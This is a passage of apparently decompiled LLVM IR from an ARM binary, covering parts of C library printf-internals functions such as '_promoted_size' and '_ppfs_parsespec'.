  %v1_10a64 = inttoptr i32 %v0_10a64 to i32*
  %v2_10a64 = load i32, i32* %v1_10a64, align 4
  store i32 %v2_10a64, i32* %r3.global-to-local, align 4
  %v1_10a68 = load i32, i32* %ip.global-to-local, align 4
  %v2_10a68 = inttoptr i32 %v1_10a68 to i32*
  store i32 %v2_10a64, i32* %v2_10a68, align 4
  br label %dec_label_pc_10a6c

dec_label_pc_10a6c:                               ; preds = %dec_label_pc_10a44, %dec_label_pc_10a30, %dec_label_pc_10a1c, %dec_label_pc_10a5c
  %v0_10a6c = load i32, i32* %ip.global-to-local, align 4
  %v1_10a6c = add i32 %v0_10a6c, 8
  store i32 %v1_10a6c, i32* %ip.global-to-local, align 4
  %v0_10a70.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_10a74.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_10a70

dec_label_pc_10a70:                               ; preds = %dec_label_pc_109ac, %dec_label_pc_10a6c
  %v0_10a74 = phi i32 [ %v0_10a7425, %dec_label_pc_109ac ], [ %v0_10a74.pre, %dec_label_pc_10a6c ]
  %v0_10a70 = phi i32 [ %v1_109ac24, %dec_label_pc_109ac ], [ %v0_10a70.pre, %dec_label_pc_10a6c ]
  %v1_10a70 = add i32 %v0_10a70, 1
  store i32 %v1_10a70, i32* %lr.global-to-local, align 4
  %v1_10a74 = add i32 %v0_10a74, 28
  %v2_10a74 = inttoptr i32 %v1_10a74 to i32*
  %v3_10a74 = load i32, i32* %v2_10a74, align 4
  store i32 %v3_10a74, i32* %r3.global-to-local, align 4
  %v5_10a7c = icmp slt i32 %v1_10a70, %v3_10a74
  br i1 %v5_10a7c, label %dec_label_pc_109ac, label %dec_label_pc_10a74.dec_label_pc_10a80.loopexit_crit_edge

dec_label_pc_10a84:                               ; preds = %entry
  br i1 %v6_10960, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_10a84
  %v2_10a88 = add i32 %v0_10948, 36
  %v3_10a88 = inttoptr i32 %v2_10a88 to i8*
  %v4_10a88 = load i8, i8* %v3_10a88, align 1
  %v5_10a88 = zext i8 %v4_10a88 to i32
  %v5_10a8c = mul nuw nsw i32 %v5_10a88, 8
  %v6_10a8c = add i32 %v5_10a8c, %v1_10954
  store i32 %v6_10a8c, i32* %r3.global-to-local, align 4
  %v2_10a90 = add i32 %v6_10a8c, -8
  %v3_10a90 = inttoptr i32 %v2_10a90 to i32*
  %v4_10a90 = load i32, i32* %v3_10a90, align 4
  store i32 %v4_10a90, i32* %r3.global-to-local, align 4
  store i32 %v4_10a90, i32* %v2_10958, align 4
  %v0_10a98.pre = load i32, i32* @r0, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_10a84, %bb
  %v2_10aac = phi i32 [ %v0_10a98.pre, %bb ], [ %v0_10948, %dec_label_pc_10a84 ]
  %v1_10a98 = add i32 %v2_10aac, 4
  %v2_10a98 = inttoptr i32 %v1_10a98 to i32*
  %v3_10a98 = load i32, i32* %v2_10a98, align 4
  store i32 %v3_10a98, i32* %r3.global-to-local, align 4
  %v6_10a9c = icmp eq i32 %v3_10a98, -2147483648
  br i1 %v6_10a9c, label %bb15, label %dec_label_pc_10a80

bb15:                                             ; preds = %.thread2
  %v2_10aa0 = add i32 %v2_10aac, 37
  %v3_10aa0 = inttoptr i32 %v2_10aa0 to i8*
  %v4_10aa0 = load i8, i8* %v3_10aa0, align 1
  %v5_10aa0 = zext i8 %v4_10aa0 to i32
  %v1_10aa4 = load i32, i32* %ip.global-to-local, align 4
  %v5_10aa4 = mul nuw nsw i32 %v5_10aa0, 8
  %v6_10aa4 = add i32 %v5_10aa4, %v1_10aa4
  store i32 %v6_10aa4, i32* %r3.global-to-local, align 4
  %v2_10aa8 = add i32 %v6_10aa4, -8
  %v3_10aa8 = inttoptr i32 %v2_10aa8 to i32*
  %v4_10aa8 = load i32, i32* %v3_10aa8, align 4
  store i32 %v4_10aa8, i32* %r3.global-to-local, align 4
  store i32 %v4_10aa8, i32* %v2_10a98, align 4
  %v0_10ab0.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_10a80

dec_label_pc_10a74.dec_label_pc_10a80.loopexit_crit_edge: ; preds = %dec_label_pc_10a70
  br label %dec_label_pc_10a80.loopexit

dec_label_pc_10a80.loopexit:                      ; preds = %dec_label_pc_10a74.dec_label_pc_10a80.loopexit_crit_edge, %dec_label_pc_109a4
  %v0_10a74.lcssa = phi i32 [ %v0_10a74, %dec_label_pc_10a74.dec_label_pc_10a80.loopexit_crit_edge ], [ %v0_10a7418, %dec_label_pc_109a4 ]
  br label %dec_label_pc_10a80

dec_label_pc_10a80:                               ; preds = %dec_label_pc_10a80.loopexit, %.thread2, %bb15
  %v1_10ad0 = phi i32 [ %v0_10a74.lcssa, %dec_label_pc_10a80.loopexit ], [ %v2_10aac, %.thread2 ], [ %v0_10ab0.pre, %bb15 ]
  %v1_10ab0 = add i32 %v1_10ad0, 8
  %v2_10ab0 = inttoptr i32 %v1_10ab0 to i32*
  %v3_10ab0 = load i32, i32* %v2_10ab0, align 4
  store i32 %v3_10ab0, i32* %r1.global-to-local, align 4
  %v1_10ab4 = icmp slt i32 %v3_10ab0, 0
  br i1 %v1_10ab4, label %bb17, label %bb16

bb16:                                             ; preds = %dec_label_pc_10a80
  %v5_10ab8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v5_10ab8, i32* @r4, align 4
  ret i32 %v1_10ad0

bb17:                                             ; preds = %dec_label_pc_10a80
  %v1_10abc = add i32 %v1_10ad0, 16
  %v2_10abc = inttoptr i32 %v1_10abc to i32*
  %v3_10abc = load i32, i32* %v2_10abc, align 4
  %v1_10ac4 = sub i32 0, %v3_10ab0
  store i32 %v1_10ac4, i32* %r1.global-to-local, align 4
  %v1_10ac0 = and i32 %v3_10abc, -10
  %v1_10ac8 = or i32 %v1_10ac0, 8
  store i32 %v1_10ac8, i32* %r3.global-to-local, align 4
  store i32 32, i32* %r2.global-to-local, align 4
  %v2_10ad0 = add i32 %v1_10ad0, 20
  %v3_10ad0 = inttoptr i32 %v2_10ad0 to i32*
  store i32 32, i32* %v3_10ad0, align 4
  %v0_10ad4 = load i32, i32* %r1.global-to-local, align 4
  %v1_10ad4 = load i32, i32* @r0, align 4
  %v2_10ad4 = add i32 %v1_10ad4, 8
  %v3_10ad4 = inttoptr i32 %v2_10ad4 to i32*
  store i32 %v0_10ad4, i32* %v3_10ad4, align 4
  %v0_10ad8 = load i32, i32* %r3.global-to-local, align 4
  %v1_10ad8 = load i32, i32* @r0, align 4
  %v2_10ad8 = add i32 %v1_10ad8, 16
  %v3_10ad8 = inttoptr i32 %v2_10ad8 to i32*
  store i32 %v0_10ad8, i32* %v3_10ad8, align 4
  %v2_10adc = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_10adc, i32* @r4, align 4
  %v8_10adc = load i32, i32* @r0, align 4
  ret i32 %v8_10adc

; uselistorder directives
  uselistorder i32 %v1_10a70, { 2, 1, 0 }
  uselistorder i32 %v0_10a74, { 1, 2, 0 }
  uselistorder i32 %v3_109bc, { 3, 1, 0, 2, 4 }
  uselistorder i32* %v2_109bc, { 4, 2, 3, 0, 1, 5 }
  uselistorder i32 %v3_109b0, { 1, 2, 0, 8, 5, 3, 4, 7, 6, 9, 10, 11 }
  uselistorder i32 %v1_109ac24, { 1, 0 }
  uselistorder i32 %v0_10a7418, { 2, 0, 1 }
  uselistorder i32 %v0_10948, { 0, 3, 1, 2, 5, 4, 6 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 16, 7, 8, 9, 10, 11, 12, 13, 14, 15, 23, 17, 18, 19, 20, 21, 22 }
  uselistorder i32* %ip.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7 }
  uselistorder label %dec_label_pc_10a80, { 0, 2, 1 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %dec_label_pc_10a70, { 1, 0 }
  uselistorder label %dec_label_pc_10a6c, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_10a5c, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_10a44, { 1, 0 }
  uselistorder label %dec_label_pc_10a30, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_109ac, { 1, 0 }
  uselistorder label %dec_label_pc_109a4, { 1, 0 }
  uselistorder label %dec_label_pc_10980, { 1, 0 }
}

define i32 @_promoted_size() local_unnamed_addr {
entry:
  %v1_10afc.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_10ae8

dec_label_pc_10ae8:                               ; preds = %dec_label_pc_10b04, %entry
  %v0_10ae8 = phi i32 [ %v1_10ae8, %dec_label_pc_10b04 ], [ ptrtoint (i32* @global_var_19fac.356 to i32), %entry ]
  %v1_10ae8 = add i32 %v0_10ae8, -2
  %v1_10aec = add i32 %v0_10ae8, -1
  %v2_10aec = inttoptr i32 %v1_10aec to i8*
  %v3_10aec = load i8, i8* %v2_10aec, align 1
  %v4_10aec = zext i8 %v3_10aec to i32
  %v1_10af0 = inttoptr i32 %v1_10ae8 to i8*
  %v2_10af0 = load i8, i8* %v1_10af0, align 2
  %v3_10af0 = zext i8 %v2_10af0 to i32
  %v3_10af4 = mul nuw i32 %v4_10aec, 16777216
  %v4_10af8 = sdiv i32 %v3_10af4, 65536
  %v5_10af8 = or i32 %v4_10af8, %v3_10af0
  %v9_10afc = icmp eq i32 %v5_10af8, %v1_10afc.pre
  br i1 %v9_10afc, label %dec_label_pc_10ae8.dec_label_pc_10b10_crit_edge, label %dec_label_pc_10b04

dec_label_pc_10ae8.dec_label_pc_10b10_crit_edge:  ; preds = %dec_label_pc_10ae8
  br label %dec_label_pc_10b10

dec_label_pc_10b04:                               ; preds = %dec_label_pc_10ae8
  %tmp = icmp ugt i32 %v1_10ae8, ptrtoint (i32* @global_var_19f94.358 to i32)
  br i1 %tmp, label %dec_label_pc_10ae8, label %dec_label_pc_10b10

dec_label_pc_10b10:                               ; preds = %dec_label_pc_10b04, %dec_label_pc_10ae8.dec_label_pc_10b10_crit_edge
  %v2_10b18.pre-phi = sub i32 %v1_10ae8, ptrtoint (i32* @global_var_19f94.358 to i32)
  store i32 ptrtoint (i32* @global_var_19fac.356 to i32), i32* @r2, align 4
  %v4_10b1c = sdiv i32 %v2_10b18.pre-phi, 2
  %v5_10b1c = add i32 %v4_10b1c, ptrtoint (i32* @global_var_19fac.356 to i32)
  %v6_10b1c = inttoptr i32 %v5_10b1c to i8*
  %v7_10b1c = load i8, i8* %v6_10b1c, align 1
  %v9_10b1c = zext i8 %v7_10b1c to i32
  ret i32 %v9_10b1c

; uselistorder directives
  uselistorder i32 %v1_10ae8, { 0, 1, 3, 2 }
  uselistorder i32 %v0_10ae8, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_19fac.356 to i32), { 1, 2, 0 }
}

define i32 @_ppfs_parsespec(i32* %arg1) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %tmp106 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-87 = alloca i32, align 4
  %stack_var_-88 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_10b30 = load i32, i32* @r4, align 4
  store i32 %v3_10b30, i32* %stack_var_-32, align 4
  %v6_10b30 = load i32, i32* @r5, align 4
  %v25_10b30 = ptrtoint i32* %stack_var_-32 to i32
  %v1_10b34 = add i32 %tmp, 16
  %v2_10b34 = inttoptr i32 %v1_10b34 to i32*
  %v3_10b34 = load i32, i32* %v2_10b34, align 4
  %v2_10b38 = ptrtoint i32* %stack_var_-88 to i32
  %v1_10b3c = and i32 %v3_10b34, 128
  store i32 %v1_10b3c, i32* @r4, align 4
  %v2_10b3c = icmp eq i32 %v1_10b3c, 0
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 8, i32* %r3.global-to-local, align 4
  store i32 %tmp, i32* %r7.global-to-local, align 4
  %v1_10b5c = add i32 %tmp, 24
  %v2_10b5c = inttoptr i32 %v1_10b5c to i32*
  %v3_10b5c = load i32, i32* %v2_10b5c, align 4
  store i32 %v3_10b5c, i32* %sb.global-to-local, align 4
  br i1 %v2_10b3c, label %bb, label %dec_label_pc_10b7c

bb:                                               ; preds = %entry
  %v3_10b60 = load i32, i32* %arg1, align 4
  br label %dec_label_pc_10bc8

dec_label_pc_10b6c:                               ; preds = %dec_label_pc_10d4c
  %v0_10b6c = load i32, i32* %r0.global-to-local, align 4
  %v0_10d7c.pre.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_10d74

dec_label_pc_10b74:                               ; preds = %dec_label_pc_10d78
  %v1_10b74 = add i32 %v0_10d7c.pre, 1
  store i32 %v1_10b74, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_10d94

dec_label_pc_10b7c:                               ; preds = %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10b80

dec_label_pc_10b80:                               ; preds = %dec_label_pc_10bb4.dec_label_pc_10b80_crit_edge, %dec_label_pc_10b7c
  %v1_10b90 = phi i32 [ %v1_10ba4, %dec_label_pc_10bb4.dec_label_pc_10b80_crit_edge ], [ 0, %dec_label_pc_10b7c ]
  %v0_10b80 = phi i32 [ %v0_10b80.pre, %dec_label_pc_10bb4.dec_label_pc_10b80_crit_edge ], [ %tmp, %dec_label_pc_10b7c ]
  %v1_10b80 = inttoptr i32 %v0_10b80 to i32*
  %v2_10b80 = load i32, i32* %v1_10b80, align 4
  %v4_10b84 = mul i32 %v1_10b90, 4
  %v5_10b84 = add i32 %v2_10b80, %v4_10b84
  store i32 %v5_10b84, i32* %r3.global-to-local, align 4
  %v1_10b88 = add i32 %v5_10b84, -4
  %v2_10b88 = inttoptr i32 %v1_10b88 to i32*
  %v3_10b88 = load i32, i32* %v2_10b88, align 4
  store i32 %v3_10b88, i32* %r1.global-to-local, align 4
  store i32 %v25_10b30, i32* %ip.global-to-local, align 4
  %v2_10b90 = add i32 %v1_10b90, %v25_10b30
  store i32 %v2_10b90, i32* %r2.global-to-local, align 4
  %v1_10b94 = trunc i32 %v3_10b88 to i8
  %v3_10b94 = add i32 %v2_10b90, -56
  %v4_10b94 = inttoptr i32 %v3_10b94 to i8*
  store i8 %v1_10b94, i8* %v4_10b94, align 1
  %v0_10b98 = load i32, i32* %r2.global-to-local, align 4
  %v1_10b98 = add i32 %v0_10b98, -56
  %v2_10b98 = inttoptr i32 %v1_10b98 to i8*
  %v3_10b98 = load i8, i8* %v2_10b98, align 1
  %v4_10b98 = zext i8 %v3_10b98 to i32
  store i32 %v4_10b98, i32* %r2.global-to-local, align 4
  %v0_10b9c = load i32, i32* %r3.global-to-local, align 4
  %v1_10b9c = add i32 %v0_10b9c, -4
  %v2_10b9c = inttoptr i32 %v1_10b9c to i32*
  %v3_10b9c = load i32, i32* %v2_10b9c, align 4
  store i32 %v3_10b9c, i32* %r3.global-to-local, align 4
  %v9_10ba0 = icmp eq i32 %v4_10b98, %v3_10b9c
  %v0_10ba4 = load i32, i32* %r0.global-to-local, align 4
  %v1_10ba4 = add i32 %v0_10ba4, 1
  store i32 %v1_10ba4, i32* %r0.global-to-local, align 4
  br i1 %v9_10ba0, label %dec_label_pc_10bac, label %dec_label_pc_10fc4

dec_label_pc_10bac:                               ; preds = %dec_label_pc_10b80
  %v2_10bac = icmp eq i8 %v3_10b98, 0
  br i1 %v2_10bac, label %dec_label_pc_10bbc, label %dec_label_pc_10bb4

dec_label_pc_10bb4:                               ; preds = %dec_label_pc_10bac
  %tmp166 = icmp ult i32 %v1_10ba4, 32
  br i1 %tmp166, label %dec_label_pc_10bb4.dec_label_pc_10b80_crit_edge, label %dec_label_pc_10bbc

dec_label_pc_10bb4.dec_label_pc_10b80_crit_edge:  ; preds = %dec_label_pc_10bb4
  %v0_10b80.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_10b80

dec_label_pc_10bbc:                               ; preds = %dec_label_pc_10bb4, %dec_label_pc_10bac
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_10bc4 = ptrtoint i32* %stack_var_-87 to i32
  br label %dec_label_pc_10bc8

dec_label_pc_10bc8:                               ; preds = %bb, %dec_label_pc_10bbc
  %storemerge102 = phi i32 [ %v2_10bc4, %dec_label_pc_10bbc ], [ %v3_10b60, %bb ]
  store i32 %storemerge102, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r8.global-to-local, align 4
  store i32 0, i32* @lr, align 4
  br label %dec_label_pc_10bd8

dec_label_pc_10bd4:                               ; preds = %.thread22, %dec_label_pc_10ce4
  %v0_10bd4 = phi i32 [ %v2_10d5c, %.thread22 ], [ %storemerge105, %dec_label_pc_10ce4 ]
  %stack_var_-48.0 = phi i32 [ %stack_var_-48.3, %.thread22 ], [ %stack_var_-48.2, %dec_label_pc_10ce4 ]
  store i32 %v0_10bd4, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_10bd8

dec_label_pc_10bd8:                               ; preds = %dec_label_pc_10bc8, %dec_label_pc_10bd4
  %v1_10bf4 = phi i32 [ %storemerge102, %dec_label_pc_10bc8 ], [ %v0_10bd4, %dec_label_pc_10bd4 ]
  %stack_var_-48.1 = phi i32 [ %tmp106, %dec_label_pc_10bc8 ], [ %stack_var_-48.0, %dec_label_pc_10bd4 ]
  %v1_10bd8 = inttoptr i32 %v1_10bf4 to i8*
  %v2_10bd8 = load i8, i8* %v1_10bd8, align 1
  %v3_10bd8 = zext i8 %v2_10bd8 to i32
  store i32 %v3_10bd8, i32* %r3.global-to-local, align 4
  %v7_10bdc = icmp eq i8 %v2_10bd8, 42
  br i1 %v7_10bdc, label %bb124, label %.thread9.thread

.thread9.thread:                                  ; preds = %dec_label_pc_10bd8
  store i32 %v1_10bf4, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.preheader

bb124:                                            ; preds = %dec_label_pc_10bd8
  %v1_10be8 = load i32, i32* @lr, align 4
  %v4_10be8 = mul i32 %v1_10be8, -4
  %v5_10be8 = add i32 %v4_10be8, %v25_10b30
  store i32 %v5_10be8, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_10bf4 = add i32 %v1_10bf4, 1
  store i32 %v2_10bf4, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v3_10bfc = add i32 %v5_10be8, -12
  %v4_10bfc = inttoptr i32 %v3_10bfc to i32*
  store i32 0, i32* %v4_10bfc, align 4
  %v0_10c20.pre.pre = load i32, i32* %r6.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %bb124, %.thread9.thread
  %v0_10c20.pre = phi i32 [ %v0_10c20.pre.pre, %bb124 ], [ %v1_10bf4, %.thread9.thread ]
  %v2_10c24.pre = load i32, i32* @global_var_231b0, align 4
  br label %.backedge

dec_label_pc_10c04:                               ; preds = %.backedge
  store i32 4094, i32* %r3.global-to-local, align 4
  %v0_10c08 = load i32, i32* %r0.global-to-local, align 4
  %v7_10c0c = icmp sgt i32 %v0_10c08, 4094
  br i1 %v7_10c0c, label %.thread12, label %bb126

.thread12:                                        ; preds = %dec_label_pc_10c04
  %v1_10c1414 = add i32 %v0_10c98, 1
  store i32 %v1_10c1414, i32* %r6.global-to-local, align 4
  br label %.backedge

bb126:                                            ; preds = %dec_label_pc_10c04
  %v11_10c10 = mul i32 %v0_10c08, 10
  %v12_10c10 = add i32 %v11_10c10, %v3_10c20
  store i32 %v12_10c10, i32* %r3.global-to-local, align 4
  %v1_10c14 = add i32 %v0_10c98, 1
  store i32 %v1_10c14, i32* %r6.global-to-local, align 4
  %v9_10c18 = add i32 %v12_10c10, -48
  store i32 %v9_10c18, i32* %r0.global-to-local, align 4
  br label %.backedge

.backedge:                                        ; preds = %.thread12, %bb126, %.preheader
  %v0_10c98 = phi i32 [ %v0_10c20.pre, %.preheader ], [ %v1_10c14, %bb126 ], [ %v1_10c1414, %.thread12 ]
  store i32 ptrtoint (i32* @global_var_231b0 to i32), i32* %r3.global-to-local, align 4
  %v1_10c20 = inttoptr i32 %v0_10c98 to i8*
  %v2_10c20 = load i8, i8* %v1_10c20, align 1
  %v3_10c20 = zext i8 %v2_10c20 to i32
  store i32 %v3_10c20, i32* %r2.global-to-local, align 4
  store i32 %v2_10c24.pre, i32* %r3.global-to-local, align 4
  %v3_10c28 = mul nuw nsw i32 %v3_10c20, 2
  %v4_10c28 = add i32 %v3_10c28, %v2_10c24.pre
  %v5_10c28 = inttoptr i32 %v4_10c28 to i8*
  %v6_10c28 = load i8, i8* %v5_10c28, align 1
  %v8_10c28 = zext i8 %v6_10c28 to i32
  store i32 %v8_10c28, i32* %r3.global-to-local, align 4
  %v1_10c2c = and i32 %v8_10c28, 8
  %v2_10c2c = icmp eq i32 %v1_10c2c, 0
  br i1 %v2_10c2c, label %dec_label_pc_10c34, label %dec_label_pc_10c04

dec_label_pc_10c34:                               ; preds = %.backedge
  %v0_10c34 = load i32, i32* %r1.global-to-local, align 4
  %v1_10c34 = add i32 %v0_10c34, -1
  %v2_10c34 = inttoptr i32 %v1_10c34 to i8*
  %v3_10c34 = load i8, i8* %v2_10c34, align 1
  %v4_10c34 = zext i8 %v3_10c34 to i32
  store i32 %v4_10c34, i32* %r3.global-to-local, align 4
  %v7_10c38 = icmp eq i8 %v3_10c34, 37
  br i1 %v7_10c38, label %dec_label_pc_10c40, label %dec_label_pc_10cfc

dec_label_pc_10c40:                               ; preds = %dec_label_pc_10c34
  %v7_10c40 = icmp eq i8 %v2_10c20, 36
  %. = zext i1 %v7_10c40 to i32
  store i32 %., i32* %ip.global-to-local, align 4
  %v0_10c4c = load i32, i32* %r0.global-to-local, align 4
  %tmp129 = icmp slt i32 %v0_10c4c, 1
  br i1 %tmp129, label %bb130, label %thread-pre-split

bb130:                                            ; preds = %dec_label_pc_10c40
  store i32 0, i32* %ip.global-to-local, align 4
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %dec_label_pc_10c40, %bb130
  %v1_10ca8 = phi i32 [ 0, %bb130 ], [ %., %dec_label_pc_10c40 ]
  %v2_10c54 = icmp eq i32 %v1_10ca8, 0
  %v0_10c84 = load i32, i32* %sb.global-to-local, align 4
  br i1 %v2_10c54, label %dec_label_pc_10c84, label %dec_label_pc_10c5c

dec_label_pc_10c5c:                               ; preds = %thread-pre-split
  %v2_10c84 = icmp eq i32 %v0_10c84, 0
  %v1_10c60 = add i32 %v0_10c98, 1
  store i32 %v1_10c60, i32* %r1.global-to-local, align 4
  br i1 %v2_10c84, label %dec_label_pc_10fc4, label %dec_label_pc_10c68

dec_label_pc_10c68:                               ; preds = %dec_label_pc_10c5c
  %v2_10c68 = sub i32 %v0_10c4c, %v0_10c84
  %v4_10c68 = xor i32 %v0_10c84, %v0_10c4c
  %v5_10c68 = xor i32 %v2_10c68, %v0_10c4c
  %v6_10c68 = and i32 %v5_10c68, %v4_10c68
  %v7_10c68 = icmp slt i32 %v6_10c68, 0
  %v8_10c68 = icmp slt i32 %v2_10c68, 0
  %v9_10c68 = icmp eq i32 %v0_10c4c, %v0_10c84
  %v3_10c6c = xor i1 %v8_10c68, %v7_10c68
  %v4_10c6c = or i1 %v9_10c68, %v3_10c6c
  br i1 %v4_10c6c, label %dec_label_pc_10c7c, label %bb131

bb131:                                            ; preds = %dec_label_pc_10c68
  store i32 %v0_10c4c, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_10c7c

dec_label_pc_10c78:                               ; preds = %dec_label_pc_10c98, %dec_label_pc_10ca0
  store i32 0, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_10c7c

dec_label_pc_10c7c:                               ; preds = %bb131, %dec_label_pc_10c68, %dec_label_pc_10c78
  %v0_10c7c = phi i32 [ %v0_10c34, %dec_label_pc_10c78 ], [ %v1_10c60, %dec_label_pc_10c68 ], [ %v1_10c60, %bb131 ]
  %stack_var_-48.2 = phi i32 [ %stack_var_-48.1, %dec_label_pc_10c78 ], [ %v0_10c4c, %dec_label_pc_10c68 ], [ %v0_10c4c, %bb131 ]
  br label %dec_label_pc_10cb4

dec_label_pc_10c84:                               ; preds = %thread-pre-split
  %tmp132 = icmp slt i32 %v0_10c84, 1
  br i1 %tmp132, label %dec_label_pc_10c98, label %dec_label_pc_10c8c

dec_label_pc_10c8c:                               ; preds = %dec_label_pc_10c84
  %v7_10c8c = icmp eq i8 %v2_10c20, 109
  br i1 %v7_10c8c, label %dec_label_pc_10cfc, label %dec_label_pc_10fc4

dec_label_pc_10c98:                               ; preds = %dec_label_pc_10c84
  %tmp167 = icmp ugt i32 %v0_10c98, %v0_10c34
  br i1 %tmp167, label %dec_label_pc_10ca0, label %dec_label_pc_10c78

dec_label_pc_10ca0:                               ; preds = %dec_label_pc_10c98
  %v1_10ca0 = inttoptr i32 %v0_10c34 to i8*
  %v2_10ca0 = load i8, i8* %v1_10ca0, align 1
  %v3_10ca0 = zext i8 %v2_10ca0 to i32
  store i32 %v3_10ca0, i32* %r3.global-to-local, align 4
  %v7_10ca4 = icmp eq i8 %v2_10ca0, 48
  br i1 %v7_10ca4, label %dec_label_pc_10c78, label %bb133

bb133:                                            ; preds = %dec_label_pc_10ca0
  store i32 0, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_10cfc

dec_label_pc_10cb4.loopexit:                      ; preds = %dec_label_pc_10cbc
  %v1_10cc8 = load i32, i32* @r4, align 4
  %v3_10cc8 = or i32 %v1_10cc8, %v0_10cdc
  store i32 %v3_10cc8, i32* @r4, align 4
  %v2_10ccc = add i32 %storemerge105, 1
  br label %dec_label_pc_10cb4

dec_label_pc_10cb4:                               ; preds = %dec_label_pc_10cb4.loopexit, %dec_label_pc_10c7c
  %storemerge105 = phi i32 [ %v0_10c7c, %dec_label_pc_10c7c ], [ %v2_10ccc, %dec_label_pc_10cb4.loopexit ]
  store i32 %storemerge105, i32* %r6.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_19f8c.363 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_10cc0 = inttoptr i32 %storemerge105 to i8*
  br label %dec_label_pc_10cbc

dec_label_pc_10cbc:                               ; preds = %dec_label_pc_10cd4, %dec_label_pc_10cb4
  %v0_10cdc = phi i32 [ %v2_10cdc, %dec_label_pc_10cd4 ], [ 1, %dec_label_pc_10cb4 ]
  %v0_10cbc = phi i32 [ %v5_10cbc, %dec_label_pc_10cd4 ], [ ptrtoint ([8 x i8]* @global_var_19f8c.363 to i32), %dec_label_pc_10cb4 ]
  %v1_10cbc = inttoptr i32 %v0_10cbc to i8*
  %v2_10cbc = load i8, i8* %v1_10cbc, align 1
  %v3_10cbc = zext i8 %v2_10cbc to i32
  store i32 %v3_10cbc, i32* %r2.global-to-local, align 4
  %v5_10cbc = add i32 %v0_10cbc, 1
  store i32 %v5_10cbc, i32* %r1.global-to-local, align 4
  %v2_10cc0 = load i8, i8* %v1_10cc0, align 1
  %v3_10cc0 = zext i8 %v2_10cc0 to i32
  store i32 %v3_10cc0, i32* %r3.global-to-local, align 4
  %v9_10cc4 = icmp eq i8 %v2_10cc0, %v2_10cbc
  br i1 %v9_10cc4, label %dec_label_pc_10cb4.loopexit, label %dec_label_pc_10cd4

dec_label_pc_10cd4:                               ; preds = %dec_label_pc_10cbc
  %v1_10cd4 = inttoptr i32 %v5_10cbc to i8*
  %v2_10cd4 = load i8, i8* %v1_10cd4, align 1
  %v3_10cd4 = zext i8 %v2_10cd4 to i32
  store i32 %v3_10cd4, i32* %r3.global-to-local, align 4
  %v2_10cd8 = icmp eq i8 %v2_10cd4, 0
  %v2_10cdc = mul i32 %v0_10cdc, 2
  store i32 %v2_10cdc, i32* %r0.global-to-local, align 4
  br i1 %v2_10cd8, label %dec_label_pc_10ce4, label %dec_label_pc_10cbc

dec_label_pc_10ce4:                               ; preds = %dec_label_pc_10cd4
  %v1_10ce4 = add i32 %storemerge105, -1
  %v2_10ce4 = inttoptr i32 %v1_10ce4 to i8*
  %v3_10ce4 = load i8, i8* %v2_10ce4, align 1
  %v7_10ce8 = icmp eq i8 %v3_10ce4, 37
  %v0_10cec = load i32, i32* @r4, align 4
  %v1_10cec = and i32 %v0_10cec, 10
  store i32 %v1_10cec, i32* %r3.global-to-local, align 4
  %v4_10cf0 = udiv i32 %v1_10cec, 2
  %v5_10cf0 = sub nuw nsw i32 -1, %v4_10cf0
  %v6_10cf0 = and i32 %v0_10cec, %v5_10cf0
  store i32 %v6_10cf0, i32* @r4, align 4
  br i1 %v7_10ce8, label %dec_label_pc_10cf8, label %dec_label_pc_10bd4

dec_label_pc_10cf8:                               ; preds = %dec_label_pc_10ce4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10cfc

dec_label_pc_10cfc:                               ; preds = %bb133, %dec_label_pc_10c34, %dec_label_pc_10c8c, %dec_label_pc_10cf8
  %v1_10d40 = phi i32 [ %storemerge105, %dec_label_pc_10cf8 ], [ %v0_10c98, %bb133 ], [ %v0_10c98, %dec_label_pc_10c8c ], [ %v0_10c98, %dec_label_pc_10c34 ]
